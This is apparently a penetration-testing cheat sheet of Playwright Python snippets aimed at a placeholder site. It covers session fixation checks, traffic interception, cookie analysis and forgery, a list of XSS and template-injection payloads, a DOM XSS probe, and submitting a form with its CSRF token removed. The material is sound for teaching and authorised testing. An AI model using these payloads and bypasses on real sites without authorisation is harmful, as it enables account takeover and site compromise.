# Browser QA Payloads

## Playwright Commands

### Setup
```python
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(headless=False)
    page = browser.new_page()
    page.goto("https://example.com")
```

### Async Setup
```python
import asyncio
from playwright.async_api import async_playwright

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch()
        context = await browser.new_context(
            ignore_https_errors=True,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        )
        page = await context.new_page()
        await page.goto("https://target.example.com")

asyncio.run(main())
```

### Navigation & Interaction
```python
# Click element
page.click("button#submit")

# Fill form
page.fill("input#username", "admin")
page.fill("input#password", "test")

# Submit form
page.click("button[type=submit]")

# Wait for navigation
page.wait_for_load_state("networkidle")

# Wait for specific element
page.wait_for_selector(".dashboard", timeout=5000)

# Select dropdown
page.select_option("select#role", "admin")

# Upload file
page.set_input_files("input[type=file]", "payload.pdf")
```

### Authentication Testing
```python
# Login and save session
page.goto("https://target.example.com/login")
page.fill("#email", "user@example.com")
page.fill("#password", "password123")
page.click("button[type=submit]")
page.wait_for_url("**/dashboard")

# Save authenticated state
context.storage_state(path="auth_state.json")

# Reuse authenticated session
context = browser.new_context(storage_state="auth_state.json")
```

### Session Fixation Test
```python
# Get session before login
cookies_before = page.context.cookies()
session_before = next((c for c in cookies_before if c['name'] == 'session_id'), None)

# Perform login
page.fill("#username", "admin")
page.fill("#password", "password")
page.click("#login")
page.wait_for_load_state("networkidle")

# Check if session changed
cookies_after = page.context.cookies()
session_after = next((c for c in cookies_after if c['name'] == 'session_id'), None)

if session_before and session_after and session_before['value'] == session_after['value']:
    print("VULNERABLE: Session fixation - session ID unchanged after login")
```

## Network Monitoring

### Request Interception
```python
# Log all requests
def handle_request(request):
    print(f"{request.method} {request.url}")
    if request.post_data:
        print(f"  Body: {request.post_data[:200]}")

page.on("request", handle_request)

# Block specific resources
page.route("**/*.{png,jpg,jpeg,gif,svg}", lambda route: route.abort())

# Modify request headers
def add_headers(route):
    headers = route.request.headers
    headers["X-Custom-Header"] = "injected"
    route.continue_(headers=headers)

page.route("**/*", add_headers)
```

### Response Interception
```python
# Monitor API responses
def handle_response(response):
    if "/api/" in response.url:
        print(f"[{response.status}] {response.url}")
        if response.status >= 400:
            print(f"  Error body: {response.text()[:500]}")

page.on("response", handle_response)
```

### Capture Network Traffic
```python
# Record HAR file
context = browser.new_context(record_har_path="traffic.har")
page = context.new_page()
page.goto("https://target.example.com")
# ... perform actions ...
context.close()  # HAR file written on close
```

## Cookie Analysis

```python
# Get all cookies
cookies = page.context.cookies()
for cookie in cookies:
    flags = []
    if not cookie.get('httpOnly'): flags.append("NO-HttpOnly")
    if not cookie.get('secure'): flags.append("NO-Secure")
    if cookie.get('sameSite') == 'None': flags.append("SameSite=None")
    if flags:
        print(f"WARNING {cookie['name']}: {', '.join(flags)}")
```

### Cookie Manipulation
```python
# Add cookie
page.context.add_cookies([{
    "name": "admin",
    "value": "true",
    "domain": "target.example.com",
    "path": "/"
}])

# Clear cookies and test access
page.context.clear_cookies()
page.goto("https://target.example.com/admin")
```

## XSS Payload Injection

```python
# Reflected XSS test
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    "'><script>alert(document.domain)</script>",
    "\"><img src=x onerror=alert(1)>",
    "{{7*7}}",  # Template injection
]

for payload in xss_payloads:
    page.fill("input#search", payload)
    page.click("button#search-submit")
    page.wait_for_load_state("domcontentloaded")
    
    # Check if payload reflected unescaped
    content = page.content()
    if payload in content and "&lt;" not in content.split(payload)[0][-50:]:
        print(f"POTENTIAL XSS: {payload}")
    
    page.go_back()
```

### DOM XSS Detection
```python
# Monitor DOM mutations for script injection
page.evaluate("""
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((m) => {
            m.addedNodes.forEach((node) => {
                if (node.nodeName === 'SCRIPT') {
                    window.__xss_detected = true;
                }
            });
        });
    });
    observer.observe(document.body, {childList: true, subtree: true});
""")

# Inject payload via URL fragment
page.goto("https://target.example.com/page#<script>alert(1)</script>")
xss_found = page.evaluate("window.__xss_detected || false")
```

## CSRF Testing

```python
# Check for CSRF token
page.goto("https://target.example.com/settings")
csrf_token = page.locator("input[name=_csrf]").get_attribute("value")
if not csrf_token:
    print("WARNING: No CSRF token found on form")

# Test if form works without CSRF token
page.evaluate("""
    const form = document.querySelector('form');
    const csrfInput = form.querySelector('input[name="_csrf"]');
    if (csrfInput) csrfInput.remove();
    form.submit();
""")
```

## Evidence Collection

### Screenshot Evidence
```python
# Full page screenshot
page.screenshot(path="evidence/full_page.png", full_page=True)

# Element-specific screenshot
page.locator(".vulnerability-detail").screenshot(path="evidence/vuln_detail.png")

# Screenshot on failure
try:
    page.click("#nonexistent", timeout=3000)
except Exception as e:
    page.screenshot(path=f"evidence/error_{int(time.time())}.png")
```

### Console Log Capture
```python
# Capture console messages
console_messages = []
page.on("console", lambda msg: console_messages.append(f"[{msg.type}] {msg.text}"))

# Check for sensitive data leaks in console
page.goto("https://target.example.com")
for msg in console_messages:
    if any(keyword in msg.lower() for keyword in ["password", "token", "secret", "api_key"]):
        print(f"DATA LEAK IN CONSOLE: {msg}")
```

## Multi-Page Testing

```python
# Test all forms on a page
forms = page.locator("form").all()
for i, form in enumerate(forms):
    action = form.get_attribute("action")
    method = form.get_attribute("method") or "GET"
    inputs = form.locator("input").all()
    print(f"Form {i}: {method} {action} ({len(inputs)} inputs)")
```

### Crawl and Test
```python
# Discover links and test each page
visited = set()
to_visit = ["https://target.example.com"]

while to_visit:
    url = to_visit.pop(0)
    if url in visited:
        continue
    visited.add(url)
    
    page.goto(url)
    links = page.locator("a[href]").all()
    for link in links:
        href = link.get_attribute("href")
        if href and href.startswith("/"):
            full_url = f"https://target.example.com{href}"
            if full_url not in visited:
                to_visit.append(full_url)
```
